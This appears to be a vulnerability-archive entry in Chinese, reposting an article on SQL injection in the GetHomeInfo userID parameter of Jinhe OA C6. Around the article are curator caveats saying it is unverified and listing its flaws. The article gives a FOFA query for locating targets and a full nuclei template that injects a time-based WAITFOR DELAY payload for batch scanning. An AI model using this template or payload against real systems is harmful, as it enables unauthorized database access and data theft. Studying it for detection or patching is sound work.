---
source: "MrWQ/vulnerability-paper"
title: "金和C6 GetHomeInfo userID SQL 注入"
product: "金和C6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "无Cookie示例未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/ZZU-A9dCqxia1eAvKALmSA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8C%20OA%20C6%20GetHomeInfo%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "语句进行资产收集... 确认测试目标**"
id: "vw-822d6fd6ab1d12c9e3c5fe2b"
entity_id: "ve-822d6fd6ab1d12c9e3c5fe2b"
schema_version: "1"
---

# 金和C6 GetHomeInfo userID SQL 注入

## 条目说明

- 对象与具体问题：金和C6；GetHomeInfo userID SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：无Cookie示例未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA误取叙述，正文有完整表达式
- nuclei Host模板花括号被反斜线污染
- 只duration>=5无基线/状态/重复差分，网络慢可误报
- 缺根因/修复build；装饰图片多

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZZU-A9dCqxia1eAvKALmSA)

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZcbkPzbbzL0u8YfnxxDicUbg1G9MQHvibjeC6zx3TVGq2hoGcCrz2iaKwTTteKRJq7z29iaTM0GJ3UFQg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/6RaZ4vPeOmSVjiaqZGLNX4d3vWbaxFZJvfRGwaibvubSsH0Z8ZYFOBuLwIuicrggnMBcgnaA5ssdXZo2Nv9EQgJibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/J9ribgc84yUiak32pdP7Plz4nGLCA6g3Sr5VEpxpqJxHjVhzfUiayqqSznhsz9X2MjJGrfibn8pwhic0tRicVA6MWHaw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/r067acKJkcgvrLCvF4XYBMB0taDTJUJzUhxiaicqaZCzp76unGS5APGLMcbrnSkXgxKOpaZulmDzQTia0ongdJ0uQ/640?wx_fmt=png)

漏洞简介

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hibxrQoTBwtW59vnGianzS0wGxzU1N1CicAk4u8vCDJMTYsYicpib6icd1nLhMDdaicvbktrz0ia0TQ4LAhBTnINyjnu2w/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f99C5hg1oLNDZJenq13YIYzsCMJkEL7ChzaKl0OIpkKGx0ibsjDMsPSbQHSk8SYgseTcDpDNCvwq7G5Wuxs2oyQ/640?wx_fmt=png)

        金和网络是专业信息化服务商，为城市监管部门提供了互联网 + 监管解决方案，为企事业单位提供组织协同 OA 系统升开发平台，电子政务一体化平台智慧电商平台等服务。金和 OA C6 GetHomeInfo 接口处存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

![](https://mmbiz.qpic.cn/mmbiz_png/6RaZ4vPeOmSVjiaqZGLNX4d3vWbaxFZJvfRGwaibvubSsH0Z8ZYFOBuLwIuicrggnMBcgnaA5ssdXZo2Nv9EQgJibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/J9ribgc84yUiak32pdP7Plz4nGLCA6g3Sr5VEpxpqJxHjVhzfUiayqqSznhsz9X2MjJGrfibn8pwhic0tRicVA6MWHaw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/r067acKJkcgvrLCvF4XYBMB0taDTJUJzUhxiaicqaZCzp76unGS5APGLMcbrnSkXgxKOpaZulmDzQTia0ongdJ0uQ/640?wx_fmt=png)

漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hibxrQoTBwtW59vnGianzS0wGxzU1N1CicAk4u8vCDJMTYsYicpib6icd1nLhMDdaicvbktrz0ia0TQ4LAhBTnINyjnu2w/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f99C5hg1oLNDZJenq13YIYzsCMJkEL7ChzaKl0OIpkKGx0ibsjDMsPSbQHSk8SYgseTcDpDNCvwq7G5Wuxs2oyQ/640?wx_fmt=png)

**第一步、使用下面 fofa 语句进行资产收集... 确认测试目标**

```
fofa语句
app="金和网络-金和OA"

```

**第二步、访问漏洞首页**

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZcbkPzbbzL0u8YfnxxDicUbge3VDSrlaibpSadNlWibZaaEskxZqY2fJwN90gkVv7xDw1hDiazExia4C3Q/640?wx_fmt=png&from=appmsg)

**第三步、拼接 POC 进行访问，拼接 POC 使用 burp 进行抓包... 发送到 Repeater 中进行测试**

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZcbkPzbbzL0u8YfnxxDicUbgbdtDGNkvsDX5BMC9mobSBPyRfxojEKiaxgziax2PCGfIRcHG0OAhG5IQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/6RaZ4vPeOmSVjiaqZGLNX4d3vWbaxFZJvfRGwaibvubSsH0Z8ZYFOBuLwIuicrggnMBcgnaA5ssdXZo2Nv9EQgJibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/J9ribgc84yUiak32pdP7Plz4nGLCA6g3Sr5VEpxpqJxHjVhzfUiayqqSznhsz9X2MjJGrfibn8pwhic0tRicVA6MWHaw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/r067acKJkcgvrLCvF4XYBMB0taDTJUJzUhxiaicqaZCzp76unGS5APGLMcbrnSkXgxKOpaZulmDzQTia0ongdJ0uQ/640?wx_fmt=png)

批量脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hibxrQoTBwtW59vnGianzS0wGxzU1N1CicAk4u8vCDJMTYsYicpib6icd1nLhMDdaicvbktrz0ia0TQ4LAhBTnINyjnu2w/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f99C5hg1oLNDZJenq13YIYzsCMJkEL7ChzaKl0OIpkKGx0ibsjDMsPSbQHSk8SYgseTcDpDNCvwq7G5Wuxs2oyQ/640?wx_fmt=png)

```
id: jinhe-jc6-GetHomeInfo-sqlij
info:
  name: jinhe-jc6-GetHomeInfo-sqlij
  author: kanyue
  severity: high
  description: |
    金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务。金和OA C6 GetHomeInfo接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  metadata:
    fofa-query: app="金和网络-金和OA"
  tags: jinhe,jc6,oa,sqlij
http:
  - raw:
      - |
        GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: \{\{Hostname\}\}
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
